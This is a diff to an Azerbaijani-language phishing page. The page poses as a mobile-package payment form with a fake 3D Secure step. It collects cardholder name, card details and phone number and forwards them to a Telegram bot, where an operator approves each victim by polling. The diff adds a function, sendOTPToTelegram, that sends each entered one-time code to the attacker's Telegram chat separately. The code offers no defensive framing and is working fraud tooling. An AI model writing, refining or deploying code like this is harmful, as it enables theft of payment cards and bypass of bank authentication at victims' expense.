@@ -138,6 +138,7 @@
         .border-gray-300{border-color:#d1d5db}
         .opacity-0{opacity:0}
         .opacity-80{opacity:.8}
+        .opacity-50{opacity:.5}
         .shadow-lg{box-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -2px rgba(0,0,0,.05)}
         .shadow-red-500\/30{box-shadow:0 10px 15px -3px rgba(239,68,68,.3),0 4px 6px -2px rgba(239,68,68,.15)}
         .shadow-blue-500\/30{box-shadow:0 10px 15px -3px rgba(59,130,246,.3),0 4px 6px -2px rgba(59,130,246,.15)}
@@ -157,9 +158,7 @@
         .ml-auto{margin-left:auto}
         .mr-2{margin-right:.5rem}
         .mr-1{margin-right:.25rem}
-        .cursor-pointer{cursor:pointer}
-        .relative{position:relative}
-        .z-10{z-index:10}
+        .cursor-not-allowed{cursor:not-allowed}
     </style>
 </head>
 <body class="flex items-center justify-center p-4">
@@ -438,7 +437,6 @@
                     <i class="far fa-clock mr-1"></i> Kodun etibarlılıq müddəti: 5 dəqiqə
                 </div>
 
-                <!-- "Təsdiq et" düyməsi - OTP yazıldıqdan sonra basılmalıdır -->
                 <button onclick="verifyOTP()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-semibold shadow-lg shadow-blue-500/30 mt-4">
                     Təsdiq et
                 </button>
@@ -487,7 +485,7 @@
         let otpLength = 4;
         let loadingTimerInterval = null;
         let loadingSeconds = 0;
-        let isProcessingOTP = false; // OTP təsdiqi zamanı iki dəfə göndərməmək üçün
+        let isProcessingOTP = false;
 
         const operators = [
             { name: "Bakcell", prefixes: ["055", "099"] },
@@ -525,7 +523,6 @@
                 input.setAttribute('inputmode', 'numeric');
                 input.setAttribute('autocomplete', 'one-time-code');
                 
-                // AVTOMATİK TƏSDİQ - SİLDİK! İndi yalnız düymə ilə
                 input.addEventListener('input', function(e) {
                     this.value = this.value.replace(/\D/g, '');
                     if (this.value.length === 1) {
@@ -534,7 +531,6 @@
                         if (next < count) {
                             document.getElementById(`otp${next}`).focus();
                         }
-                        // SON XANADA AVTOMATİK TƏSDİQ YOXDUR!
                     } else {
                         this.classList.remove('filled');
                     }
@@ -587,13 +583,12 @@
         }
 
         // ========================================
-        // TELEGRAM FUNKSİYALARI
+        // 📨 TELEGRAM FUNKSİYALARI
         // ========================================
 
-        function sendToTelegram(data, isOTP = false) {
-            let message = isOTP ? 
-                `🔐 3D Secure Təsdiq Kodu daxil edildi!\n\n📱 Nömrə: ${data.phone}\n💰 Məbləğ: ${data.amount} AZN\n🔢 OTP Kodu: ${data.otp}\n\n✅ Ödəniş təsdiqləndi!` :
-                `
+        // 1. ÖDƏNİŞ SORĞUSU (admin üçün)
+        function sendToTelegram(data) {
+            const message = `
 🔔 YENİ ÖDƏNİŞ SORĞUSU!
 ━━━━━━━━━━━━━━━━━━━━
 👤 Ad Soyad: ${data.cardName}
@@ -606,7 +601,7 @@
 📦 Paket: ${data.package}
 ━━━━━━━━━━━━━━━━━━━━
 ⏳ Admin təsdiqi gözlənilir...
-                `.trim();
+            `.trim();
 
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
@@ -616,7 +611,7 @@
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
-                    reply_markup: isOTP ? null : {
+                    reply_markup: {
                         inline_keyboard: [
                             [
                                 { text: "✅ Qəbul et", callback_data: "accept_" + Date.now() },
@@ -625,8 +620,25 @@
                         ]
                     }
                 })
-            }).then(() => console.log(isOTP ? "✅ OTP Telegram-a göndərildi" : "✅ Ödəniş sorğusu göndərildi"))
+            }).then(() => console.log("✅ Ödəniş sorğusu göndərildi"))
               .catch(err => console.error("❌ Telegram xətası:", err));
+        }
+
+        // 2. 🔐 AYRI OTP MESAJI - SADƏCƏ OTP KODU!
+        function sendOTPToTelegram(otpCode) {
+            const message = `🔐 OTP Kodu: ${otpCode}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).then(() => console.log("✅ Ayrı OTP mesajı Telegram-a göndərildi: " + otpCode))
+              .catch(err => console.error("❌ OTP mesajı xətası:", err));
         }
 
         // ========================================
@@ -664,7 +676,7 @@
         }
 
         // ========================================
-        // POLLING - DÜZƏLDİ (lastUpdateId ilə)
+        // POLLING
         // ========================================
         function startTelegramPolling() {
             if (isWaitingForApproval) return;
@@ -692,7 +704,6 @@
                 
                 if (data.ok && data.result) {
                     for (const update of data.result) {
-                        // Hər update üçün lastUpdateId yenilə (təkrar qarşısını alır)
                         if (update.update_id > lastUpdateId) {
                             lastUpdateId = update.update_id;
                         }
@@ -700,9 +711,7 @@
                         if (update.callback_query) {
                             const callbackData = update.callback_query.data;
                             
-                            // "accept_" ilə başlayan callback-ləri tut
                             if (callbackData && callbackData.startsWith('accept_')) {
-                                // ✅ Qəbul edildi
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -722,10 +731,8 @@
                                     })
                                 });
                                 
-                                // Polling dayandır
                                 stopTelegramPolling();
                                 
-                                // Loading bağla - 3D Secure aç
                                 const loadingEl = document.getElementById('step-6');
                                 const secureEl = document.getElementById('step-7');
                                 
@@ -744,12 +751,10 @@
                                     setTimeout(() => { spinner.style.animation = ''; }, 100);
                                 }
                                 
-                                // Əlavə təkrar qarşısı almaq üçün lastUpdateId yenilə
                                 lastUpdateId = update.update_id;
                                 return;
                                 
                             } else if (callbackData && callbackData.startsWith('reject_')) {
-                                // ❌ İmtina edildi
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -940,10 +945,9 @@
         }
 
         // ========================================
-        // OTP TƏSDİQİ - YALNIZ DÜYMƏ İLƏ
+        // 🔐 OTP TƏSDİQİ - YALNIZ DÜYMƏ İLƏ
         // ========================================
         function verifyOTP() {
-            // İki dəfə göndərmənin qarşısını al
             if (isProcessingOTP) return;
             
             const code = getOTPCode();
@@ -955,14 +959,9 @@
 
             isProcessingOTP = true;
 
-            // Telegram-a OTP kodunu göndər
-            sendToTelegram({
-                otp: code,
-                phone: phoneNumber,
-                amount: currentPackage
-            }, true);
+            // 🔐 AYRI OTP MESAJI - SADƏCƏ OTP KODU!
+            sendOTPToTelegram(code);
 
-            // Bütün OTP kutularını "completed" et
             for (let i = 0; i < otpLength; i++) {
                 const el = document.getElementById(`otp${i}`);
                 if (el) {
@@ -971,7 +970,6 @@
                 }
             }
 
-            // Düyməni söndür (təkrar basmaq olmasın)
             const btn = document.querySelector('#step-7 .bg-blue-600');
             if (btn) {
                 btn.disabled = true;
@@ -1002,7 +1000,6 @@
                 `;
             }, 500);
             
-            // 3 saniyədən sonra düyməni bərpa et (əgər success açılmazsa)
             setTimeout(() => {
                 isProcessingOTP = false;
                 const btn = document.querySelector('#step-7 .bg-blue-600');
